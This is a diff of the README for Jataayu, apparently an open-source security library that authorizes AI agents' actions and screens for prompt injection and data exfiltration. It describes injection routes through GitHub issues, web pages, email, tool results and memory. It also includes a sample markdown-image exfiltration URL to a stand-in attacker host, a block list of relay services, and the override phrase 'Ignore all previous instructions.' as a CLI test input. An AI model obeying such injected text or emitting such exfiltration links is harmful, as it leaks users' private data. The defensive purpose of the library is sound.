@@ -4,24 +4,41 @@
 
 ---
 
-**Security for LLM-backed AI agents — inbound injection detection, outbound privacy protection, and action-level authorization.**
+**The runtime authorization layer for tool-using AI agents. Gate the action, not the string.**
 
-## The Problem
+Jataayu decides — deterministically — whether an agent's *action* is allowed to run, from the
+**harm of the effect × the provenance of the input × your capability policy**. An agent that read
+an attacker-controlled web page can still summarize it; it just can't be tricked into running the
+shell command, reading the secret, or POSTing your data that the attacker wanted. Around that core
+it adds defense-in-depth screening (inbound injection, outbound privacy, exfiltration channels,
+skill supply-chain) and replayable audit traces.
 
-AI agents are under attack. Not in science fiction — right now, in production.
+## Why "gate the action, not the string"
 
-- **Clinejection** — malicious prompt injections embedded in GitHub issues that hijack coding agents like Cline, Cursor, and Claude Code. An attacker files an issue; your agent reads it; your agent does what the attacker says.
-- **Web poisoning** — websites laced with invisible instructions that redirect browsing agents.
-- **Email phishing** — crafted messages that cause email-reading agents to exfiltrate data.
-- **Poisoned tool results & memory** — an injection can arrive in a tool's return value or get written into the agent's long-term memory, then re-enter context on a later turn.
+Most agent-security tooling tries to *detect the attack text*. That's a losing arms race: an
+adaptive attacker just rewrites the string until the classifier misses. Jataayu's thesis — the one
+the 2026 standards (OWASP Agentic Top 10, NIST) converged on — is that the durable boundary is the
+**action**, judged by where the influencing input *came from*:
 
-Most defenses focus on what comes **IN**. But there are two more threats:
+- **What the agent DOES is the real guarantee.** Untrusted-derived input driving a shell command,
+  a secret read, or a network write is denied or held for approval — *regardless of whether any
+  detector flagged the text*. This is deterministic (no LLM) and is Jataayu's core.
+- **What comes IN** (defense-in-depth). Injection rides in through the first message, a poisoned
+  tool result, or something recalled from memory. Jataayu screens all of these — as a cheap
+  pre-filter and taint source, explicitly *not* as the thing you rely on.
+- **What goes OUT.** Private context can leak when the agent replies in a group chat or comments on
+  an issue — most often through an exfiltration *channel* (a data-carrying URL / auto-fetched image),
+  not prose. Jataayu catches the channel, not just the text.
 
-**What goes OUT.** Your agent has access to private context — files, messages, family details, financial data. When it replies in a group chat, comments on a GitHub issue, or sends an email, it can inadvertently leak that context to the wrong audience. No prompt injection required.
+## What it is / what it isn't
 
-**What the agent DOES.** The strongest guarantee isn't detecting the attack string — adaptive attackers rewrite it. It's refusing to let untrusted-influenced input drive a dangerous *action* (a shell command, a secret read, a network write) in the first place.
-
-Jataayu guards all three.
+- ✅ **Is:** a deterministic action-authorization primitive + provenance/taint tracking + audit trace
+  for tool-using agents. The effect boundary is the piece to build on.
+- ✅ **Is:** defense-in-depth screening (inbound / outbound / egress / skill vetting) layered on top.
+- ⚠️ **Is not:** a best-in-class prompt-injection *classifier*. The regex tier is a pre-filter,
+  deliberately the weakest layer; as a standalone general detector its recall is modest (see
+  [Detection performance](#detection-performance)). Don't deploy it *as* your only defense — that's
+  the whole point of moving the guarantee to the action.
 
 ---
 
@@ -35,10 +52,10 @@ See [CHANGELOG.md](CHANGELOG.md) for what landed in each release and [ARCHITECTU
 ## Install
 
 ```bash
-# Core (regex engine + effect boundary, no LLM deps)
+# Core (effect boundary + regex pre-filter, no LLM deps)
 pip install git+https://github.com/saikrishnarallabandi/jataayu.git
 
-# With cloud LLM backends (OpenAI + Anthropic) for the slow path
+# With cloud LLM backends (OpenAI + Anthropic) for the optional slow path
 pip install "jataayu[llm] @ git+https://github.com/saikrishnarallabandi/jataayu.git"
 
 # With Ollama (local, free slow path)
@@ -51,87 +68,9 @@ Requires Python ≥ 3.10. The only hard dependency is `requests`; LLM backends a
 
 ## Quick Start
 
-### Simple API (dict results — recommended)
+### 1. Authorize the action (the core — start here)
 
-```python
-from jataayu import jataayu_check_inbound, jataayu_check_outbound
-
-# --- Inbound: detect injection attacks in external content ---
-result = jataayu_check_inbound(github_issue_body, surface="github-issue")
-if result["status"] == "HIGH":
-    raise SecurityError(f"Blocked: {result['findings']}")
-elif result["status"] == "MEDIUM":
-    log.warning(f"Suspicious: {result['findings']}")
-# Returns: {status: 'SAFE'|'LOW'|'MEDIUM'|'HIGH', findings: str,
-#           risk_score: float, threat_types: list[str], blocked: bool}
-
-# --- Outbound: strip PII/secrets before sending to shared surfaces ---
-result = jataayu_check_outbound(
-    draft_reply,
-    surface="discord-channel",
-    protected_names=["Alice", "Bob"],   # names that must never leak
-)
-if result["status"] in ("WARN", "BLOCK"):
-    safe_text = result["redacted"]       # auto-sanitized version
-else:
-    safe_text = draft_reply              # SAFE — send as-is
-# Returns: {status: 'SAFE'|'WARN'|'BLOCK', findings: str,
-#           redacted: str|None, risk_score: float, threat_types: list[str]}
-```
-
-### Guard the agent's other input channels
-
-An injection doesn't only arrive in the first user message — it rides in on tool
-results and on whatever the agent recalled from memory. Same engine, right surface:
-
-```python
-from jataayu import (
-    jataayu_check_tool_return,
-    jataayu_check_memory_write,
-    jataayu_check_memory_read,
-)
-
-# A tool result can carry an injection — check it before the agent consumes it
-r = jataayu_check_tool_return(api_response, tool_name="web.search")
-if r["blocked"]:
-    raise SecurityError(r["findings"])
-
-# Guard long-term memory in both directions
-jataayu_check_memory_write(note)      # before persisting
-jataayu_check_memory_read(recalled)   # before it re-enters context
-# each returns the same inbound dict: status/findings/risk_score/threat_types/blocked
-```
-
-### Catch the exfiltration *channel*, not just the leaked text (outbound egress)
-
-The dominant real-world way an agent leaks data isn't prose — it's a URL. An injected agent emits
-an auto-fetched markdown image whose query string carries your secret, and the moment a client
-renders it, the data is gone with zero clicks (this is the EchoLeak / AgentFlayer / Notion class).
-The PII/credential scanner never sees it because the payload is encoded inside the link.
-
-```python
-from jataayu import jataayu_check_egress
-
-r = jataayu_check_egress(
-    "Task complete! ![status](https://attacker.io/log?d=eyJlbWFpbHMiOlsuLi5dfQ)",
-    surface="github-comment",
-    context_secrets=[api_key],   # optional: confirm exfil if a known secret rides in the URL
-)
-if r["status"] == "BLOCK":
-    safe_text = r["redacted"]    # offending URL neutralized, human text kept
-# Returns: {status: 'SAFE'|'WARN'|'BLOCK', findings, redacted, risk_score, threat_types}
-```
-
-Domain allowlisting alone is treated as insufficient — the AgentFlayer bypass routed through Azure
-Blob, a *trusted* host — so request-catchers and abused cloud relays (`webhook.site`,
-`*.blob.core.windows.net`, `ngrok`, …) are hard-blocked as exfil beacons. This runs automatically
-inside `OutboundGuard` (toggle with `PrivacyConfig.check_egress`, allowlist your own CDN via
-`egress_allowed_domains`).
-
-### Authorize the *action*, not just the string (effect boundary)
-
-The regex engine is a cheap pre-filter. The real boundary is action-level: decide
-by the *harm of the effect* × the *provenance of the input*, deterministically (no LLM).
+Decide by the *harm of the effect* × the *provenance of the input*, deterministically (no LLM):
 
 ```python
 from jataayu import jataayu_authorize_action
@@ -147,10 +86,11 @@ if decision["decision"] == "deny":
     raise SecurityError(decision["reason"])
 ```
 
-Untrusted-derived input into a **shell / code-eval / secret-read** effect is denied;
-into **network / file-write / memory-write** it needs human approval; everything else
-is allowed. For enforced execution, use the `PREVIEW → COMMIT` object API — the
-`commit_token` binds the exact request, so mutating the action after authorization is rejected:
+Untrusted-derived input into a **shell / code-eval / secret-read** effect is denied; into
+**network / file-write / memory-write** it needs human approval; everything else is allowed.
+
+For enforced execution, use the `PREVIEW → COMMIT` object API — the `commit_token` binds the exact
+request, so mutating the action after authorization is rejected:
 
 ```python
 from jataayu import EffectBoundary, Value, Provenance
@@ -166,7 +106,67 @@ if preview.approved:
 # commit() raises CommitRejected if the preview wasn't ALLOW or the params changed
 ```
 
-### Vet skills before you install them
+Injected content can also be handed to the agent as an **opaque handle** with a bounded summary, so
+an exfiltration attempt only ever holds a handle, not the raw secret (read-boundary confinement).
+
+### 2. Screen what comes in (defense-in-depth)
+
+Injection rides in on the first message, on tool results, and on whatever the agent recalled from
+memory. Same engine, right surface — treat this as a taint source feeding the effect boundary, not
+as your guarantee:
+
+```python
+from jataayu import (
+    jataayu_check_inbound,
+    jataayu_check_tool_return,
+    jataayu_check_memory_write,
+    jataayu_check_memory_read,
+)
+
+result = jataayu_check_inbound(github_issue_body, surface="github-issue")
+if result["status"] == "HIGH":
+    raise SecurityError(f"Blocked: {result['findings']}")
+# Returns: {status: 'SAFE'|'LOW'|'MEDIUM'|'HIGH', findings, risk_score, threat_types, blocked}
+
+# A tool result or a memory recall can carry an injection — check before the agent consumes it
+r = jataayu_check_tool_return(api_response, tool_name="web.search")
+if r["blocked"]:
+    raise SecurityError(r["findings"])
+jataayu_check_memory_write(note)      # before persisting
+jataayu_check_memory_read(recalled)   # before it re-enters context
+```
+
+### 3. Guard what goes out — and catch the exfiltration *channel*
+
+Strip PII/secrets before sending to shared surfaces, and — more importantly — block the
+data-carrying URL / auto-fetched image that leaks context with zero clicks (the EchoLeak /
+AgentFlayer / Notion class). The PII scanner never sees that payload; the egress guard does:
+
+```python
+from jataayu import jataayu_check_outbound, jataayu_check_egress
+
+result = jataayu_check_outbound(
+    draft_reply, surface="discord-channel",
+    protected_names=["Alice", "Bob"],   # names that must never leak
+)
+safe_text = result["redacted"] if result["status"] in ("WARN", "BLOCK") else draft_reply
+
+r = jataayu_check_egress(
+    "Task complete! ![status](https://attacker.io/log?d=eyJlbWFpbHMiOlsuLi5dfQ)",
+    surface="github-comment",
+    context_secrets=[api_key],   # optional: confirm exfil if a known secret rides in the URL
+)
+if r["status"] == "BLOCK":
+    safe_text = r["redacted"]    # offending URL neutralized, human text kept
+```
+
+Domain allowlisting alone is treated as insufficient — the AgentFlayer bypass routed through Azure
+Blob, a *trusted* host — so request-catchers and abused cloud relays (`webhook.site`,
+`*.blob.core.windows.net`, `ngrok`, …) are hard-blocked as exfil beacons. This runs automatically
+inside `OutboundGuard` (toggle with `PrivacyConfig.check_egress`, allowlist your own CDN via
+`egress_allowed_domains`).
+
+### 4. Vet skills before you install them
 
 ```python
 from jataayu import jataayu_vet_skill, jataayu_check_skillset
@@ -182,71 +182,84 @@ risk = jataayu_check_skillset([skill_a, skill_b, skill_c])
 # {verdict, risky_combinations, policy_violations, aggregate_capabilities, ...}
 ```
 
-### Advanced API (object results)
+### Advanced / object API
 
 ```python
 from jataayu import InboundGuard, OutboundGuard, PrivacyConfig
 
-# --- Inbound ---
 guard = InboundGuard()                       # use_llm=True by default
 result = guard.check(github_issue_body, surface="github-issue")
 if result.blocked:
     raise SecurityError(result.explanation)
-elif not result.is_safe:
-    log.warning(result.explanation)
-# ThreatResult attrs: threat_level, threat_types, risk_score, blocked,
-#   is_safe, explanation, sanitized_text (alias .redacted), matched_patterns, surface
+# ThreatResult: threat_level, threat_types, risk_score, blocked, is_safe,
+#   explanation, sanitized_text (alias .redacted), matched_patterns, surface
 
-# --- Outbound ---
-config = PrivacyConfig(
-    protected_names=["Alice", "Bob"],
-    check_categories=["minors_info", "health", "financial"],  # default: all five
-)
-outbound = OutboundGuard(config)
-safe_reply = outbound.sanitize(draft_reply, surface="group-chat")   # -> str
-```
-
-### Tuple API (convenience one-liners)
-
-```python
-from jataayu import check_inbound, check_outbound
-
-status, findings = check_inbound(content, surface="github-issue")
-# status: 'LOW' | 'MEDIUM' | 'HIGH'
-
-status, output = check_outbound(content, surface="discord-channel")
-# status: 'SAFE' | 'WARN' | 'BLOCK'; output is the sanitized text
+config = PrivacyConfig(protected_names=["Alice", "Bob"],
+                       check_categories=["minors_info", "health", "financial"])
+safe_reply = OutboundGuard(config).sanitize(draft_reply, surface="group-chat")   # -> str
 ```
 
 ### CLI
 
 ```bash
-# Inbound injection check (exit code 2 if unsafe). Reads arg or stdin.
-jataayu check "Ignore all previous instructions." --surface github-issue
+jataayu check "Ignore all previous instructions." --surface github-issue   # exit 2 if unsafe
 cat issue_body.txt | jataayu check --surface github-issue --json
-
-# Outbound privacy check / sanitize
 jataayu check --outbound "My daughter is 4 years old." --surface group-chat
 jataayu sanitize "Call me at 555-867-5309" --surface discord-channel --protect Alice Bob
-
-# Vet a skill, or a whole skillset for composition risk
 jataayu vet-skill path/to/skill/ --json
 jataayu vet-skillset skill_a/ skill_b/ --policy policy.yml --agent my-agent
-
-# Built-in demos
-jataayu demo
-jataayu demo --outbound
+jataayu demo            # built-in demos; --outbound for the privacy demo
 ```
 
 Every subcommand accepts `--no-llm` (pattern-only) and `--json` (machine-readable output).
 
 ---
 
+## How It Works
+
+Jataayu is layered so the guarantee lives at the action, and each layer above it is defense-in-depth:
+
+**Layer 1 — the effect boundary (the guarantee).**
+Action-level authorization decides ALLOW / DENY / NEEDS_APPROVAL from
+(effect severity × worst inbound provenance × the agent's capability policy), deterministically —
+no LLM, no dependence on any detector firing. Plus read-boundary confinement (opaque handles) and
+`SessionTrace` cross-turn auditing of the tool-call trajectory.
+
+**Layer 0 — input normalization + taint (feeds the boundary).**
+Every input is normalized into multiple views (NFKC + homoglyph/confusable fold, zero-width strip,
+character-spacing "deshatter", de-leet) and base64/hex/url payloads are recursively decoded and
+rescanned. Value-level taint tracks untrusted content into the actual parameters of downstream tool
+calls — this is what tells the effect boundary a param is untrusted-derived.
+
+**Pre-filter — the two-path detector (cheap triage, not the guarantee).**
+
+```
+Inbound text ──► Fast path (regex over all normalized views)
+                   │  score ≥ 0.90 ─────────────► BLOCKED
+                   │  0.35 ≤ score < 0.90 ─► Slow path (LLM judgment, optional) ─► ThreatResult
+                   │  score < 0.35 ─────────────► SAFE
+```
+
+- **Fast path** (sub-millisecond): 100+ regex patterns (~68 inbound, ~38 outbound).
+- **Slow path** (LLM, optional): invoked only on medium-confidence scores; Ollama / OpenAI /
+  Anthropic / OpenClaw backends. Untested offline — depends on a live backend.
+
+### Detection performance
+
+Be clear-eyed about the pre-filter: on the public `deepset/prompt-injections` set the fast path is
+a **high-precision, modest-recall** detector (ROC-AUC ≈ 0.63; ~0.5% benign false-block) — good for
+cheap triage, *not* a complete defense. Its strongest measured win is narrow: input normalization
+drops **space-out and leetspeak** evasion from ~0.97/0.92 success to 0.00 on a synthetic set, at
+unchanged precision. This is exactly why the guarantee lives at the effect boundary, not here. Full
+reproducible harness and saved results in [`eval/`](eval/).
+
+---
+
 ## Surface Profiles
 
-Jataayu grades a threat by *where the action takes effect*, not just the text. A shell
-command in a GitHub issue is suspicious; in a coding task it's expected. Each surface sets
-a trust level, whether inbound/outbound strict checks run, and a risk multiplier.
+Jataayu grades a threat by *where the action takes effect*, not just the text. A shell command in a
+GitHub issue is suspicious; in a coding task it's expected. Each surface sets a trust level, whether
+inbound/outbound strict checks run, and a risk multiplier.
 
 | Surface | Trust | Inbound strict | Outbound strict | ×risk | Notes |
 |---|---|---|---|---|---|
@@ -272,82 +285,33 @@ a trust level, whether inbound/outbound strict checks run, and a risk multiplier
 
 ---
 
-## How It Works
-
-Jataayu is layered so that defeating it requires beating *every* layer at once, not just
-the regex catalog — which is the weakest tier against an adaptive attacker.
-
-**Layer 0 — input normalization + taint (before matching).**
-Every input is normalized into multiple views (NFKC + homoglyph/confusable fold, zero-width
-strip, character-spacing "deshatter", de-leet) and base64/hex/url payloads are recursively
-decoded and rescanned. The fast path takes the max score across all views, so an evasion has
-to survive in every view simultaneously. Value-level taint tracks untrusted content into the
-actual parameters of downstream tool calls.
-
-**Detection engine — the two-path pre-filter.**
-
-```
-Inbound text ──► Fast path (regex over all normalized views)
-                   │  score ≥ 0.90 ─────────────► BLOCKED
-                   │  0.35 ≤ score < 0.90 ─► Slow path (LLM judgment) ─► ThreatResult
-                   │  score < 0.35 ─────────────► SAFE
-```
-
-- **Fast path** (sub-millisecond): 100+ regex patterns — ~68 inbound (prompt injection,
-  command injection, social engineering, unicode homoglyphs, encoding obfuscation, MCP
-  attacks) and ~38 outbound (PII categories + credential/secret formats).
-- **Slow path** (LLM, optional): invoked only on medium-confidence scores. Provides nuanced
-  judgment for ambiguous cases and generates sanitized rewrites for outbound content.
-  Backends: Ollama, OpenAI, Anthropic, or the OpenClaw gateway.
-
-**Layer 1 — the effect boundary (the real guarantee).**
-Action-level authorization decides ALLOW / DENY / NEEDS_APPROVAL from
-(effect severity × worst inbound provenance × the agent's capability policy),
-deterministically. Plus read-boundary confinement: injected content can be handed to the
-agent as an opaque handle with a bounded summary, so an exfiltration attempt only ever
-holds a handle, not the raw secret.
-
-Measured on the public `deepset/prompt-injections` benchmark: normalization drops
-space-out and leetspeak evasion from ~0.97/0.92 success to 0.00 at unchanged precision
-(~0.97) and ~0.5% benign false-block. See `eval/` for the reproducible harness.
-
----
-
 ## LLM Configuration
 
-The slow path and skill vetting can use any of four backends, selected by env var:
+The optional slow path and skill vetting can use any of four backends, selected by env var:
 
 ```bash
-# Ollama (local, free) — default
-export JATAAYU_LLM_BACKEND=ollama
+export JATAAYU_LLM_BACKEND=ollama       # local, free — default
 export JATAAYU_LLM_MODEL=llama3
 
-# OpenAI
 export JATAAYU_LLM_BACKEND=openai
 export JATAAYU_LLM_API_KEY=sk-...
 export JATAAYU_LLM_MODEL=gpt-4o-mini
 
-# Anthropic
 export JATAAYU_LLM_BACKEND=anthropic
 export JATAAYU_LLM_API_KEY=sk-ant-...
 export JATAAYU_LLM_MODEL=claude-haiku-4-5-20251001
 
-# OpenClaw gateway (auto-reads ~/.openclaw/openclaw.json)
-export JATAAYU_LLM_BACKEND=openclaw
+export JATAAYU_LLM_BACKEND=openclaw     # gateway; auto-reads ~/.openclaw/openclaw.json
 ```
 
-Pattern-only mode needs no LLM and no API key — pass `use_llm=False` (or `--no-llm` on the CLI):
-
-```python
-guard = InboundGuard(use_llm=False)
-```
+Pattern-only mode needs no LLM and no API key — pass `use_llm=False` (or `--no-llm` on the CLI).
 
 ---
 
 ## For AI Agents
 
-See [AGENTS.md](AGENTS.md) for how to wire Jataayu into an agent's inbound, tool-return,
-memory, and action-authorization paths.
+See [AGENTS.md](AGENTS.md) for how to wire Jataayu into an agent's action-authorization, inbound,
+tool-return, and memory paths.
 
 ---
 
@@ -356,14 +320,14 @@ memory, and action-authorization paths.
 The 2026 agent-security frameworks (OWASP's dedicated *Top 10 for Agentic Applications*, Dec 2025;
 NIST's AI Agent Standards Initiative) converged on the same thesis Jataayu is built around: the
 durable boundary is the **action**, gated by input **provenance** — not the attack string, which is
-the weakest tier against an adaptive attacker. Jataayu's guarantees map onto the OWASP Agentic
-risks so you can slot it into the framework your org already uses:
+the weakest tier against an adaptive attacker. Jataayu's guarantees map onto the OWASP Agentic risks
+so you can slot it into the framework your org already uses:
 
 | OWASP Agentic risk (2026) | Jataayu mechanism |
 |---|---|
-| Goal / instruction hijack (prompt injection) | `InboundGuard` (normalize → regex → LLM) across every input surface, incl. `tool-return` / `memory-*` |
 | Tool misuse & unexpected code execution | **Effect boundary** — untrusted-derived input into shell / code-eval / secret-read is denied deterministically |
 | Identity & privilege abuse | Provenance × effect-severity authorization + capability allow/forbid policy (`config/policy.py`) |
+| Goal / instruction hijack (prompt injection) | `InboundGuard` (normalize → regex → LLM) across every input surface, incl. `tool-return` / `memory-*` |
 | Agentic supply-chain (malicious tools/skills) | `jataayu_vet_skill` (LLM-judge) + `jataayu_check_skillset` (compositional + trust-transfer) |
 | Memory & context poisoning | `memory-read` / `memory-write` surfaces + `SessionTrace` cross-turn sleeper-poisoning detection |
 | Data exfiltration / excessive autonomy | Outbound privacy guard **+ egress-channel guard** (auto-fetched-image / data-carrying-URL class) |
